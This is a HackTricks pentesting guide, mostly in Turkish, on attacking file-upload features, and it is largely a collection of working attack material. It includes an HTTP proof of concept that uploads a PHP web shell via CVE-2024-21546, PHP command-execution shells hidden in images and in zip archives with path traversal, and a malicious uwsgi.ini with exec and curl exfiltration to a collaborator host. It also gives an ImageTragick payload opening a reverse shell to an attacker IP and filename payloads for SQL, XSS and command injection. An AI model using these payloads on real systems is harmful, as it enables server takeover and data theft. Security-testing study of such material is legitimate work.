# Dosya Yükleme

{{#include ../../banners/hacktricks-training.md}}

## Dosya Yükleme Genel Metodolojisi

Diğer faydalı uzantılar:

- **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
- **Working in PHPv8**: _.php_, _.php4_, .php5_, .phtml_, .module_, .inc_, .hphp_, .ctp_
- **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
- **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
- **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
- **Flash**: _.swf_
- **Perl**: _.pl, .cgi_
- **Erlang Yaws Web Server**: _.yaws_

### Dosya uzantısı kontrollerini atlatma

1. Geçerliyse, **önceki uzantıları** kontrol edin. Ayrıca bunları bazı **büyük harfler** kullanarak test edin: _pHp, .pHP5, .PhAr ..._
2. _**Yürütme uzantısından önce geçerli bir uzantı eklemeyi kontrol edin** (önceki uzantıları da kullanın):_
- _file.png.php_
- _file.png.Php5_
3. Sondan **özel karakterler** eklemeyi deneyin. Tüm **ascii** ve **Unicode** karakterlerini **bruteforce** etmek için Burp kullanabilirsiniz. (_Not: daha önce bahsedilen **uzantıları** kullanmayı da deneyebilirsiniz_)
- _file.php%20_
- _file.php%0a_
- _file.php%00_
- _file.php%0d%0a_
- _file.php/_
- _file.php.\\_
- _file._
- _file.php...._
- _file.pHp5...._
4. Sunucu tarafındaki uzantı ayrıştırıcısını kandırarak korumaları atlatmayı deneyin; örneğin uzantıyı çiftleyerek veya uzantılar arasına çöp veri (ör. **null bytes**) ekleyerek. _Daha iyi bir payload hazırlamak için önceki uzantıları da kullanabilirsiniz._
- _file.png.php_
- _file.png.pHp5_
- _file.php#.png_
- _file.php%00.png_
- _file.php\x00.png_
- _file.php%0a.png_
- _file.php%0d%0a.png_
- _file.phpJunk123png_
5. Önceki kontrole **başka bir uzantı katmanı** ekleyin:
- _file.png.jpg.php_
- _file.php%00.png%00.jpg_
6. Yürütme uzantısını geçerli uzantıdan önce koymayı deneyin ve sunucunun yanlış yapılandırılmış olmasını umut edin. (Apache yanlış yapılandırmalarını istismar etmek için faydalıdır; bazı durumlarda uzantısı .php olan her şey, dosyanın .php ile bitmemesi durumunda bile kodu çalıştırır):
- _ex: file.php.png_
7. **Windows** üzerinde NTFS alternate data stream (ADS) kullanımı. Bu durumda, yasaklı bir uzantıdan sonra ve izin verilen bir uzantıdan önce iki nokta üst üste ":" karakteri eklenecektir. Sonuç olarak, sunucuda **yasaklı uzantıya sahip boş bir dosya** oluşturulacaktır (örn. "file.asax:.jpg"). Bu dosya daha sonra kısa dosya adı kullanımı gibi diğer tekniklerle düzenlenebilir. "**::$data**” paterni de boş olmayan dosyalar oluşturmak için kullanılabilir. Bu nedenle, bu paternden sonra bir nokta karakteri eklemek ek kısıtlamaları atlatmak için faydalı olabilir (örn. "file.asp::$data.")
8. Dosya adı limitlerini aşmayı deneyin. Geçerli uzantı kırpılır. Kötü amaçlı PHP bırakılır. AAA<--SNIP-->AAA.php

```
# Linux maximum 255 bytes
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # minus 4 here and adding .png
# Upload the file and check response how many characters it alllows. Let's say 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Make the payload
AAA<--SNIP 232 A-->AAA.php.png
```

#### UniSharp Laravel Filemanager pre-2.9.1 (.php. sonundaki nokta) – CVE-2024-21546

Bazı upload handler'ları kaydedilen dosya adının sonundaki nokta karakterlerini kırpar veya normalize eder. UniSharp’ın Laravel Filemanager (unisharp/laravel-filemanager) 2.9.1 öncesi sürümlerinde, uzantı doğrulamasını aşağıdaki şekilde atlayabilirsiniz:

- Geçerli bir image MIME ve magic header kullanın (ör. PNG’nin `\x89PNG\r\n\x1a\n`).
- Yüklenen dosyayı bir PHP uzantısı ve ardından bir nokta ile adlandırın, örn. `shell.php.`.
- Sunucu sonundaki noktayı siler ve `shell.php` olarak kaydeder; bu, web’den sunulan bir dizine (varsayılan public storage gibi `/storage/files/`) yerleştirilirse çalıştırılacaktır.

Minimal PoC (Burp Repeater):
```http
POST /profile/avatar HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="upload"; filename="0xdf.php."
Content-Type: image/png

\x89PNG\r\n\x1a\n<?php system($_GET['cmd']??'id'); ?>
------WebKitFormBoundary--
```
Sonra kaydedilen yola erişin (Laravel + LFM'de tipik):
```
GET /storage/files/0xdf.php?cmd=id
```
Önlemler:
- unisharp/laravel-filemanager'i ≥ 2.9.1 sürümüne güncelleyin.
- Sunucu tarafında katı allowlists uygulayın ve kalıcı dosya adını tekrar doğrulayın.
- Yüklemeleri yürütülebilir olmayan konumlardan servis edin.

### Content-Type, Magic Number, Compression & Resizing'ı Bypass Etme

- Content-Type kontrollerini, Content-Type header'ının değerini şu şekilde ayarlayarak bypass edin: _image/png_ , _text/plain , application/octet-stream_
1. Content-Type wordlist: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt)
- Magic number kontrolünü, dosyanın başına gerçek bir resmin byte'larını ekleyerek bypass edin ( _file_ komutunu yanıltmak için). Veya shell'i metadata içine yerleştirin:\
`exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`\
`\` veya payload'u doğrudan bir görüntüye de ekleyebilirsiniz:\
`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
- Eğer resme sıkıştırma uygulanıyorsa (ör. bazı standart PHP kütüphaneleri kullanılarak, PHP-GD gibi), önceki teknikler işe yaramayabilir. Ancak sıkıştırmadan **sağ çıkacak** bazı metinleri eklemek için PLTE chunk [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) yöntemini kullanabilirsiniz.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_plte_png.php)
- Web sayfası ayrıca resmi yeniden boyutlandırıyor olabilir; örneğin PHP-GD fonksiyonları `imagecopyresized` veya `imagecopyresampled` kullanıyor olabilir. Ancak, sıkıştırmadan **sağ çıkacak** bazı metinleri eklemek için IDAT chunk [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) yöntemini kullanabilirsiniz.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_idat_png.php)
- Bir diğer teknik, PHP-GD fonksiyonu `thumbnailImage` kullanıldığında bile yeniden boyutlandırmadan **sağ kalan** bir payload oluşturma yöntemidir. Bunun için tEXt chunk [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) yöntemini kullanabilirsiniz.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_tEXt_png.php)

### Kontrol Edilecek Diğer Hileler

- Zaten yüklenmiş dosyanın adını (uzantısını değiştirmek için) yeniden adlandırmaya izin veren bir zafiyet bulun.
- Backdoor'u çalıştırmak için bir Local File Inclusion zafiyeti bulun.
- **Olası Bilgi Açığa Çıkması**:
1. Aynı dosyayı **aynı anda** **birden fazla kez** yükleyin.
2. Zaten var olan bir dosya veya klasörün **adıyla** bir dosya yükleyin.
3. Dosya adını **"."**, **".."** veya **"…"** olarak yükleyin. Örneğin, Apache üzerinde **Windows** ise ve uygulama yüklenen dosyaları "/www/uploads/" dizinine kaydediyorsa, "." dosya adı "/www/" dizininde "uploads" adında bir dosya oluşturacaktır.
4. NTFS üzerinde **"…:.jpg"** gibi kolay silinemeyen bir dosya yükleyin. (Windows)
5. Adında `|<>*?"` gibi geçersiz karakterler bulunan bir dosyayı Windows üzerinde yükleyin. (Windows)
6. CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8 ve LPT9 gibi **rezerve (yasaklanmış) isimler** kullanarak Windows'a dosya yükleyin.
- Ayrıca, kurbanın yanlışlıkla açması durumunda kod çalıştıracak bir **.exe** veya daha az şüpheli olabilecek bir **.html** yüklemeyi de deneyin.

### Özel uzantı hileleri

Eğer dosyaları bir **PHP** sunucusuna yüklüyorsanız, kodu çalıştırmak için [take a look at the **.htaccess** trick to execute code](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/index.html#code-execution) sayfasına bakın.\
Eğer dosyaları bir **ASP** sunucusuna yüklüyorsanız, kodu çalıştırmak için [take a look at the **.config** trick to execute code](../../network-services-pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files) sayfasına bakın.

`.phar` dosyaları Java için `.jar` gibidir, fakat PHP içindir ve **php dosyası gibi kullanılabilir** (php ile çalıştırılabilir veya bir script içine include edilebilir...)

`.inc` uzantısı bazen sadece **import** amaçlı kullanılan php dosyaları için kullanılır; bu durumda bir noktada biri bu uzantının **çalıştırılmasına izin vermiş** olabilir.

## **Jetty RCE**

Eğer Jetty sunucusuna bir XML dosyası yükleyebiliyorsanız, [RCE çünkü **new \*.xml and \*.war are automatically processed**](https://twitter.com/ptswarm/status/1555184661751648256/photo/1)** elde edebilirsiniz.** Bu nedenle, aşağıdaki görselde de belirtildiği gibi XML dosyasını `$JETTY_BASE/webapps/` dizinine yükleyin ve shell bekleyin!

![https://twitter.com/ptswarm/status/1555184661751648256/photo/1](<../../images/image (1047).png>)

## **uWSGI RCE**

Bu zafiyetin detaylı incelenmesi için orijinal çalışmaya bakın: [uWSGI RCE Exploitation](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html).

Remote Command Execution (RCE) zafiyetleri, `.ini` yapılandırma dosyasını değiştirme yeteneğine sahip olunursa uWSGI sunucularında istismar edilebilir. uWSGI konfigürasyon dosyaları, "magic" değişkenleri, placeholder'ları ve operatorleri içerebilen özel bir sözdizimi kullanır. Özellikle `@(filename)` şeklinde kullanılan '@' operatörü bir dosyanın içeriğini dahil etmek için tasarlanmıştır. uWSGI tarafından desteklenen çeşitli schemes arasında "exec" scheme'i özellikle güçlüdür; bir sürecin standart çıktısından veri okumaya izin verir. Bir `.ini` yapılandırma dosyası işlendiğinde, bu özellik Remote Command Execution veya Arbitrary File Write/Read gibi kötü amaçlı kullanımlar için manipüle edilebilir.

Aşağıda çeşitli schemes gösteren zararlı bir `uwsgi.ini` dosyası örneğini düşünün:
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
Payload'ın yürütülmesi, konfigürasyon dosyasının ayrıştırılması sırasında gerçekleşir. Konfigürasyonun etkinleşip ayrıştırılması için uWSGI sürecinin ya yeniden başlatılması (muhtemelen bir çökme sonrası veya bir Denial of Service attack nedeniyle) ya da dosyanın otomatik yeniden yükleme (auto-reload) olarak ayarlanması gerekir. Otomatik yeniden yükleme özelliği etkinse, değişiklikleri tespit ettiğinde dosyayı belirli aralıklarla yeniden yükler.

uWSGI'nin konfigürasyon dosyası ayrıştırmasının gevşek yapısını anlamak çok önemlidir. Özellikle bahsedilen payload bir ikili dosyaya (ör. bir resim veya PDF) yerleştirilebilir; bu da olası istismar kapsamını daha da genişletir.

## **wget File Upload/SSRF Trick**

Bazı durumlarda bir sunucunun **`wget`** kullanarak **dosya indirdiğini** ve sizin **URL** belirtmenize izin verdiğini görebilirsiniz. Bu durumlarda, kod indirilen dosyaların uzantısının yalnızca izin verilenlerin indirileceğinden emin olmak için bir beyaz liste içinde olup olmadığını kontrol ediyor olabilir. Ancak, **bu kontrol atlatılabilir.**\
linux'ta bir **dosya adının** **maksimum** uzunluğu **255**'tir, ancak **wget** dosya adlarını **236** karaktere kadar kısaltır. Siz **"A"\*232+".php"+".gif"** adlı bir dosya indirebilirsiniz; bu dosya adı **kontrolü atlatır** (örneğin bu durumda **".gif"** **geçerli** bir uzantıdır) ancak `wget` dosyayı **"A"\*232+".php"** olarak yeniden adlandırır.
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’ saved [10/10]
```
Note that **another option** you may be thinking of to bypass this check is to make the **HTTP server redirect to a different file**, so the initial URL will bypass the check by then wget will download the redirected file with the new name. This **won't work** **unless** wget is being used with the **parameter** `--trust-server-names` because **wget will download the redirected page with the name of the file indicated in the original URL**.

## Araçlar

- [Upload Bypass](https://github.com/sAjibuu/Upload_Bypass) güçlü bir araçtır ve Pentesters ile Bug Hunters'ın file upload mekanizmalarını test etmelerine yardımcı olmak için tasarlanmıştır. Çeşitli bug bounty tekniklerinden yararlanarak zafiyetleri tespit etmeyi ve exploit etmeyi kolaylaştırır, web uygulamalarının kapsamlı değerlendirilmesini sağlar.

### Corrupting upload indices with snprintf quirks (historical)

Bazı legacy upload handler'lar, tek dosyalık bir upload'tan multi-file array'leri oluşturmak için `snprintf()` veya benzerini kullanırken `_FILES` yapısını forge etmeye ikna edilebilir. `snprintf()` davranışındaki tutarsızlıklar ve truncation nedeniyle, dikkatle hazırlanmış tek bir upload sunucu tarafında birden fazla indexlenmiş dosya gibi görünebilir; bu da katı bir shape varsayan (ör. multi-file upload olarak ele alıp unsafe branch'lere giren) mantığı kafası karışmış hale getirir. Bugün nadir olsa da, bu “index corruption” paterni ara sıra CTF'lerde ve eski kod tabanlarında yeniden ortaya çıkar.

## From File upload to other vulnerabilities

- Set **filename** to `../../../tmp/lol.png` and try to achieve a **path traversal**
- Set **filename** to `sleep(10)-- -.jpg` and you may be able to achieve a **SQL injection**
- Set **filename** to `<svg onload=alert(document.domain)>` to achieve a XSS
- Set **filename** to `; sleep 10;` to test some command injection (more [command injections tricks here](../command-injection.md))
- [**XSS** in image (svg) file upload](../xss-cross-site-scripting/index.html#xss-uploading-files-svg)
- **JS** file **upload** + **XSS** = [**Service Workers** exploitation](../xss-cross-site-scripting/index.html#xss-abusing-service-workers)
- [**XXE in svg upload**](../xxe-xee-xml-external-entity.md#svg-file-upload)
- [**Open Redirect** via uploading svg file](../open-redirect.md#open-redirect-uploading-svg-files)
- Try **different svg payloads** from [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)
- [Famous **ImageTrick** vulnerability](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
- If you can **indicate the web server to catch an image from a URL** you could try to abuse a [SSRF](../ssrf-server-side-request-forgery/index.html). If this **image** is going to be **saved** in some **public** site, you could also indicate a URL from [https://iplogger.org/invisible/](https://iplogger.org/invisible/) and **steal information of every visitor**.
- [**XXE and CORS** bypass with PDF-Adobe upload](pdf-upload-xxe-and-cors-bypass.md)
- Specially crafted PDFs to XSS: The [following page present how to **inject PDF data to obtain JS execution**](../xss-cross-site-scripting/pdf-injection.md). If you can upload PDFs you could prepare some PDF that will execute arbitrary JS following the given indications.
- Upload the \[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt)) content to check if the server has any **antivirus**
- Check if there is any **size limit** uploading files

Here’s a top 10 list of things that you can achieve by uploading (from [here](https://twitter.com/SalahHasoneh1/status/1281274120395685889)):

1. **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE
2. **SVG**: Stored XSS / SSRF / XXE
3. **GIF**: Stored XSS / SSRF
4. **CSV**: CSV injection
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS** : HTML injection / XSS / Open redirect
8. **PNG / JPEG**: Pixel flood attack (DoS)
9. **ZIP**: RCE via LFI / DoS
10. **PDF / PPTX**: SSRF / BLIND XXE

#### Burp Extension


{{#ref}}
https://github.com/portswigger/upload-scanner
{{#endref}}

## Magic Header Bytes

- **PNG**: `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\x s0\x03["`
- **JPG**: `"\xff\xd8\xff"`

Refer to [https://en.wikipedia.org/wiki/List_of_file_signatures](https://en.wikipedia.org/wiki/List_of_file_signatures) for other filetypes.

## Zip/Tar File Automatically decompressed Upload

If you can upload a ZIP that is going to be decompressed inside the server, you can do 2 things:

### Symlink

Upload a link containing soft links to other files, then, accessing the decompressed files you will access the linked files:
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### Farklı klasörlere Decompress

Dekompress/archiv açma sırasında dizinlerde beklenmedik dosyaların oluşturulması önemli bir sorundur. İlk etapta bu yapılandırmanın zararlı dosya yüklemeleri yoluyla OS-level command execution'u engelleyeceği düşünülse de, ZIP archive format'ın hierarchical compression support ve directory traversal yetenekleri sömürülebilir. Bu, saldırganların kısıtlamaları atlamasına ve hedef uygulamanın decompression işlevini manipüle ederek güvenli upload directories'den kaçmasına olanak tanır.

Böyle dosyaları oluşturmak için otomatik bir exploit [**evilarc on GitHub**](https://github.com/ptoomey3/evilarc)'da mevcuttur. Yardımcı program şu şekilde kullanılabilir:
```python
# Listing available options
python2 evilarc.py -h
# Creating a malicious archive
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
Ek olarak, **symlink trick with evilarc** bir seçenektir. Eğer hedef `/flag.txt` gibi bir dosya ise, sisteminizde o dosyaya bir symlink oluşturulmalıdır. Bu, evilarc'ın çalışması sırasında hata ile karşılaşmamasını sağlar.

Aşağıda kötü amaçlı bir zip dosyası oluşturmak için kullanılan Python koduna bir örnek bulunmaktadır:
```python
#!/usr/bin/python
import zipfile
from io import BytesIO

def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
**Sıkıştırmayı file spraying için kötüye kullanma**

Daha fazla detay için **orijinal gönderiye bakın**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)

1.  **PHP Shell Oluşturma**: PHP kodu, `$_REQUEST` değişkeni aracılığıyla iletilen komutları çalıştırmak için yazılır.

```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```

2.  **File Spraying ve Sıkıştırılmış Dosya Oluşturma**: Birden fazla dosya oluşturulur ve bu dosyaları içeren bir zip arşivi oluşturulur.

```bash
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# zip cmd.zip xx*.php
```

3.  **Hex Editor veya vi ile Değiştirme**: Zip içindeki dosya isimleri vi veya bir hex editor kullanılarak değiştirilir; dizinleri geçmek için "xxA" "../" ile değiştirilir.

```bash
:set modifiable
:%s/xxA/..\//g
:x!
```

## ImageTragic

Bu içeriği bir image uzantısıyla yükleyerek açığı kötüye kullanın **(ImageMagick , 7.0.1-1)** (exploit: [https://www.exploit-db.com/exploits/39767](https://www.exploit-db.com/exploits/39767))
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## PNG İçine PHP Shell Gömme

PNG dosyasının IDAT chunk'ına bir PHP shell gömmek, belirli görüntü işleme operasyonlarını etkili bir şekilde atlatabilir. PHP-GD'den `imagecopyresized` ve `imagecopyresampled` fonksiyonları bu bağlamda özellikle önemlidir; bunlar sırasıyla resimlerin yeniden boyutlandırılması ve yeniden örneklenmesi için yaygın olarak kullanılır. Gömülü PHP shell'in bu işlemlerden etkilenmeden kalabilme yeteneği, bazı kullanım senaryoları için önemli bir avantaj sağlar.

Bu tekniğin metodolojisi ve potansiyel uygulamalarını ayrıntılı şekilde inceleyen makale şurada bulunabilir: ["Encoding Web Shells in PNG IDAT chunks"](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/). Bu kaynak, sürecin ve etkilerinin kapsamlı bir anlayışını sunar.

More information in: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## Polyglot Files

Polyglot files, aynı anda birden fazla dosya formatında geçerli olabilen kameleonlar gibi davranarak siber güvenlikte benzersiz bir araç görevi görür. İlginç bir örnek [GIFAR](https://en.wikipedia.org/wiki/Gifar) olup, hem GIF hem de RAR arşivi olarak işlev gören hibrittir. Bu tür dosyalar sadece bu eşleşmeyle sınırlı değildir; GIF ve JS veya PPT ve JS gibi kombinasyonlar da mümkündür.

Polyglot dosyaların temel faydası, dosyaları türüne göre tarayan güvenlik önlemlerini atlatabilme yetenekleridir. Birçok uygulamada yalnızca belirli dosya türlerinin yüklenmesine izin verilir—örneğin JPEG, GIF veya DOC—böylece potansiyel olarak zararlı formatların (ör. JS, PHP veya Phar dosyaları) riski azaltılmaya çalışılır. Ancak bir polyglot, birden çok dosya türünün yapısal kriterlerine uyarak bu kısıtlamaları gizlice aşabilir.

Uyarlanabilirliklerine rağmen polyglot'ların sınırlamaları vardır. Örneğin bir polyglot aynı anda bir PHAR dosyası (PHp ARchive) ve bir JPEG içerebilir, ancak yükleme başarısı platformun dosya uzantısı politikalarına bağlı olabilir. Sistem izin verilen uzantılar konusunda katıysa, bir polyglot'un sadece yapısal çiftliği yüklenmesini garanti etmeyebilir.

More information in: [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

### PDF gibi davranarak geçerli JSON'ları yükleme

PDF taklidi yaparak izin verilmese bile geçerli bir JSON dosyası yükleyerek dosya türü tespitlerinden nasıl kaçınılacağı (teknikler **[this blog post](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)** kaynağından alınmıştır):

- **`mmmagic` library**: İlk 1024 bayt içinde `%PDF` magic bytes olduğ sürece geçerlidir (örnek için yazıya bakın)
- **`pdflib` library**: JSON'un bir alanı içine sahte bir PDF formatı ekleyin ki kütüphane bunun bir pdf olduğunu düşünsün (örnek için yazıya bakın)
- **`file` binary**: Bir dosyadan 1048576 bayta kadar okuyabilir. İçeriği bir json olarak parse edememesi için daha büyük bir JSON oluşturun ve sonra JSON içinde gerçek bir PDF'in başlangıç kısmını koyun; böylece PDF olduğunu düşünecektir

## Referanslar

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
- [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
- [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
- [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
- [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
- [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)
- [https://blog.doyensec.com/2025/01/09/cspt-file-upload.html](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)
- [CVE-2024-21546 – NVD entry](https://nvd.nist.gov/vuln/detail/CVE-2024-21546)
- [PoC gist for LFM .php. bypass](https://gist.github.com/ImHades101/338a06816ef97262ba632af9c78b78ca)
- [0xdf – HTB Environment (UniSharp LFM upload → PHP RCE)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)

{{#include ../../banners/hacktricks-training.md}}
